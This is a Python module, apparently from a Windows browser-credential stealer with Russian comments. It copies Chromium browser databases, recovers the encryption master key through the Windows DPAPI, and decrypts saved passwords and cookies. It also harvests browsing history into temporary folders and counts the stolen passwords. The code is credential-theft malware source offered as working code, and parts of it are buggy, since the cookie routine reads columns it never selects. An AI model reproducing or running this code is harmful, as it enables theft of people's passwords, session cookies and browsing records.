import base64
import json
import os
import random
import win32crypt
from Crypto.Cipher import AES
import shutil
import sqlite3
from datetime import datetime

from .Counter import Count


current_user = os.getlogin()  # имя пользователя
user_path = os.path.expanduser('~')  # C:\\Users\\Admin
local = os.getenv('LOCALAPPDATA')  # C:\Users\Admin\AppData\Local
roaming = os.getenv('APPDATA')  # C:\Users\Admin\AppData\Roaming
temp = os.getenv("TEMP")  # C:\Users\Admin\AppData\Local\Temp

main_path = os.getenv("TEMP") + rf'\{datetime.today()}'.replace(':', '-')  # C:\Users\Admin\AppData\Local\Temp\2023-04-13 00-37-32.242157


class BrowsersSupport:
    @staticmethod
    def start():
        try:
            os.makedirs(main_path)
        except:
            pass

    @staticmethod
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    @staticmethod
    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    @staticmethod
    def DecryptValue(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = BrowsersSupport.generate_cipher(master_key, iv)
            decrypted_pass = BrowsersSupport.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Can't decode"

    @staticmethod
    def get_master_key(path):
        """ получаем мастер пароль """
        with open(path, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # находим защифрованный ключ
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt(buff, master_key):
        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"


class BrowsersData:
    @staticmethod
    def get_history(path, arg, browser_name):
        path_to_history = path + arg + "/History"
        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(path_to_history, tempfold)

        conn = sqlite3.connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM urls")

        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        _temp = []
        for result in data:
            _temp.append(f"### {result[0]} {result[1]} {result[2]}\n")
        Count.dict_of_history[browser_name] = _temp
        save_data(browser_name)


    @staticmethod
    def get_cookies(path, arg):
        path_to_cookie = path + arg + "/Cookies"
        if os.stat(path_to_cookie).st_size == 0:
            return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(path_to_cookie, tempfold)
        conn = sqlite3.connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        results = '[\n'
        for result in data:
            secure = result[8] == 0
            http = result[9] == 0

            results += '''
	{
		"domain": "%s",
		"expirationDate": %s,
		"name": "%s",
		"httpOnly": %s,
		"path": "%s",
		"secure": %s,
		"value": "%s"
	},
			''' % (result[1], result[7], result[3], http, result[6], secure,
                   BrowsersSupport.decrypt(result[5], BrowsersSupport.get_master_key(path)))

        with open(user_path, "w", encoding="utf-8") as cookies:
            results = results.replace('True', 'true')
            results = results.replace('False', 'false')
            results = results.replace('""', '"')
            results = results[:-1] + '\n]'
            cookies.write(results)

    @staticmethod
    def get_login_and_password(path, arg):
        try:
            pathLocalState = path + '\\Local State'
            pathLoginData = path + arg + "\\Login Data"
            tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"

            master_key = BrowsersSupport.get_master_key(pathLocalState)
            shutil.copy2(pathLoginData, tempfold)

            conn = sqlite3.connect(tempfold)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            data = cursor.fetchall()
            cursor.close()
            conn.close()
            os.remove(tempfold)

            for r in data:
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = BrowsersSupport.DecryptValue(encrypted_password, master_key)

                Count.list_of_passwords.append(f"URL: {url} | UserName:  {username} | Password: {decrypted_password}\n")
                Count.count_passwords += 1
        except Exception as err:
            print(err)



"""
решить пробему создания папок 

"""

def save_data(browser_name):
    BrowsersSupport.start()
    path = main_path + f'/{browser_name}'
    try:
        os.mkdir(path)
    except:
        print('[-] Main path already exists')


def del_main_path_directory():
    try:
        shutil.rmtree(main_path)
    except:
        print('[-] An error occurred during the deletion')
